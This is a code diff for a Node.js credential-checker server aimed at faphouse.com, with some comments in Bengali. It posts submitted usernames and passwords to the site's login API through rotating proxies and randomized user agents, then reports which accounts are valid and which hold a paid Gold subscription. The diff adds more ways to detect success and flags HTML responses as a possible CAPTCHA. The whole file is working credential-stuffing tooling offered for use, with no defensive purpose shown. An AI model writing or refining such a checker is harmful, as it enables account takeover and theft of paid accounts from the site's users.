@@ -5,7 +5,6 @@ const bodyParser = require('body-parser');
 const path = require('path');
 
 const app = express();
-
 app.use(cors());
 app.use(bodyParser.json());
 app.use(express.static(path.join(__dirname, '../public')));
@@ -21,9 +20,9 @@ function getRandomUA() {
   return uas[Math.floor(Math.random() * uas.length)];
 }
 
-// Proxy parser (supports host:port:user:pass and URL format)
 function parseProxy(str) {
   try {
+    // 1. host:port:user:pass
     const parts = str.split(':');
     if (parts.length === 4) {
       const [host, port, username, password] = parts;
@@ -32,6 +31,7 @@ function parseProxy(str) {
         return { host, port: portNum, protocol: 'http', auth: { username, password } };
       }
     }
+    // 2. URL format
     const url = new URL(str);
     const protocol = url.protocol.replace(':', '');
     const host = url.hostname;
@@ -41,53 +41,67 @@ function parseProxy(str) {
       return { host, port, protocol, auth };
     }
     return null;
-  } catch (e) {
+  } catch {
     return null;
   }
 }
 
 app.post('/api/check', async (req, res) => {
-  const { username, password, proxy } = req.body;
-
-  if (!username || !password) {
-    return res.status(400).json({ success: false, error: 'Missing credentials' });
-  }
-
-  let proxyConfig = null;
-  if (proxy) {
-    const parsed = parseProxy(proxy);
-    if (parsed) {
-      proxyConfig = parsed;
-      console.log(`Using proxy: ${proxyConfig.host}:${proxyConfig.port}`);
-    } else {
-      console.warn(`Invalid proxy format: ${proxy}`);
-    }
-  }
-
-  const axiosConfig = {
-    timeout: 30000,
-    headers: {
-      'User-Agent': getRandomUA(),
-      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
-      'Accept-Language': 'en-US,en;q=0.9',
-      'Connection': 'keep-alive'
-    },
-    ...(proxyConfig && { proxy: proxyConfig })
-  };
-
-  let debugInfo = {};
-
+  // সব error কে JSON রেসপন্সে রূপান্তর করব
   try {
+    const { username, password, proxy } = req.body;
+    if (!username || !password) {
+      return res.status(400).json({ success: false, error: 'Missing credentials' });
+    }
+
+    let proxyConfig = null;
+    if (proxy) {
+      const parsed = parseProxy(proxy);
+      if (parsed) {
+        proxyConfig = parsed;
+        console.log(`[PROXY] Using ${parsed.host}:${parsed.port}`);
+      } else {
+        console.warn(`[PROXY] Invalid format: ${proxy} – skipping`);
+      }
+    }
+
+    const axiosConfig = {
+      timeout: 30000,
+      headers: {
+        'User-Agent': getRandomUA(),
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+        'Accept-Language': 'en-US,en;q=0.9',
+        'Connection': 'keep-alive'
+      }
+    };
+
+    // Add proxy if available
+    if (proxyConfig) {
+      axiosConfig.proxy = proxyConfig;
+    }
+
+    let debug = { proxyUsed: proxyConfig ? `${proxyConfig.host}:${proxyConfig.port}` : 'none' };
+
     // Step 1: Get trackingParamsBag
-    const homeResp = await axios.get('https://faphouse.com/', axiosConfig);
+    let homeResp;
+    try {
+      homeResp = await axios.get('https://faphouse.com/', axiosConfig);
+    } catch (e) {
+      return res.json({
+        success: false,
+        error: `Failed to fetch homepage: ${e.message}`,
+        debug: { ...debug, homeError: e.message }
+      });
+    }
+
     const html = homeResp.data;
-    debugInfo.homeStatus = homeResp.status;
+    debug.homeStatus = homeResp.status;
     const match = html.match(/trackingParamsBag\\":\\"([^"]+)\\"/);
     if (!match) {
-      return res.status(500).json({ success: false, error: 'Could not extract trackingParamsBag', debug: debugInfo });
+      return res.json({ success: false, error: 'trackingParamsBag not found in HTML', debug });
     }
     const trackingParamsBag = match[1];
-    debugInfo.trackingParamsBag = trackingParamsBag;
+    debug.trackingParamsBag = trackingParamsBag;
 
     // Step 2: Login
     const loginPayload = {
@@ -113,76 +127,91 @@ app.post('/api/check', async (req, res) => {
       'User-Agent': getRandomUA()
     };
 
-    const loginResp = await axios.post(
-      'https://faphouse.com/api/auth/signin',
-      loginPayload,
-      {
-        ...axiosConfig,
-        headers: loginHeaders
+    let loginResp;
+    try {
+      loginResp = await axios.post(
+        'https://faphouse.com/api/auth/signin',
+        loginPayload,
+        { ...axiosConfig, headers: loginHeaders }
+      );
+    } catch (e) {
+      // যদি proxy বা network error হয়
+      let errorMsg = e.message;
+      if (e.response) {
+        errorMsg = `HTTP ${e.response.status}: ${e.response.data || ''}`;
+        debug.loginErrorStatus = e.response.status;
+        debug.loginErrorData = e.response.data;
+      } else if (e.request) {
+        errorMsg = 'No response from server (proxy may be dead)';
       }
-    );
+      return res.json({
+        success: false,
+        error: `Login request failed: ${errorMsg}`,
+        debug
+      });
+    }
 
     const data = loginResp.data;
-    debugInfo.loginStatus = loginResp.status;
-    debugInfo.loginData = data; // পুরো রেসপন্স ডেটা
+    debug.loginStatus = loginResp.status;
+    debug.loginData = data;
 
-    // চেক করা হচ্ছে "Invalid credential"
-    if (data && data.message && data.message.includes('Invalid credential')) {
-      return res.json({ success: false, gold: false, error: 'Invalid credential', debug: debugInfo });
+    // Check invalid credential
+    if (data && data.message && typeof data.message === 'string' && data.message.toLowerCase().includes('invalid credential')) {
+      return res.json({ success: false, gold: false, error: 'Invalid credential', debug });
     }
 
-    // সফলতা চেক – অনেক ভেরিয়েন্ট
+    // Determine success
     let success = false;
-    if (data && (data.success === true || data.status === 'success' || data.message === 'success')) {
-      success = true;
-    }
-    // যদি data.success undefined থাকে কিন্তু data.user থাকে, তাহলেও সফল
-    if (data && data.user && data.user.id) {
-      success = true;
-    }
+    if (data && (data.success === true || data.success === 'true')) success = true;
+    if (data && data.status === 'success') success = true;
+    if (data && data.message === 'success') success = true;
+    if (data && data.user && data.user.id) success = true;
+    if (data && data.token) success = true;
 
     if (!success) {
-      return res.json({ success: false, gold: false, error: 'Login failed (no success flag)', debug: debugInfo });
+      if (typeof data === 'string' && data.includes('<!DOCTYPE html>')) {
+        return res.json({ success: false, gold: false, error: 'CAPTCHA or HTML response', debug });
+      }
+      return res.json({ success: false, gold: false, error: 'Login failed (no success indicator)', debug });
     }
 
-    // Gold চেক
+    // Gold check
     let hasGold = false;
     if (data && data.hasGoldSubscription !== undefined) {
       hasGold = data.hasGoldSubscription === true || data.hasGoldSubscription === 'true';
     } else if (data && data.user && data.user.hasGoldSubscription !== undefined) {
       hasGold = data.user.hasGoldSubscription === true || data.user.hasGoldSubscription === 'true';
+    } else if (data && data.subscription && data.subscription.gold === true) {
+      hasGold = true;
     } else {
-      // fallback profile check
+      // fallback: try profile
       try {
-        const profileResp = await axios.get('https://faphouse.com/api/user/profile', {
-          ...axiosConfig,
-          headers: {
-            ...loginHeaders,
-            'Authorization': `Bearer ${data.token || ''}`
+        const token = data.token || (data.user && data.user.token) || '';
+        if (token) {
+          const profileResp = await axios.get('https://faphouse.com/api/user/profile', {
+            ...axiosConfig,
+            headers: {
+              ...loginHeaders,
+              'Authorization': `Bearer ${token}`
+            }
+          });
+          if (profileResp.data && profileResp.data.hasGoldSubscription !== undefined) {
+            hasGold = profileResp.data.hasGoldSubscription === true;
           }
-        });
-        if (profileResp.data && profileResp.data.hasGoldSubscription !== undefined) {
-          hasGold = profileResp.data.hasGoldSubscription === true;
+          debug.profileData = profileResp.data;
         }
-        debugInfo.profileData = profileResp.data;
       } catch (_) {}
     }
 
-    return res.json({ success: true, gold: hasGold, debug: debugInfo });
+    return res.json({ success: true, gold: hasGold, debug });
 
-  } catch (error) {
-    console.error('Check error:', error.message);
-    if (error.response) {
-      debugInfo.errorStatus = error.response.status;
-      debugInfo.errorData = error.response.data;
-    } else {
-      debugInfo.errorMessage = error.message;
-    }
+  } catch (unexpectedError) {
+    // কোন অপ্রত্যাশিত error (যেমন JSON পার্সিং error)
+    console.error('UNEXPECTED ERROR:', unexpectedError);
     return res.status(500).json({
       success: false,
-      gold: false,
-      error: error.message || 'Request failed',
-      debug: debugInfo
+      error: 'Internal server error: ' + unexpectedError.message,
+      stack: process.env.NODE_ENV === 'development' ? unexpectedError.stack : undefined
     });
   }
 });
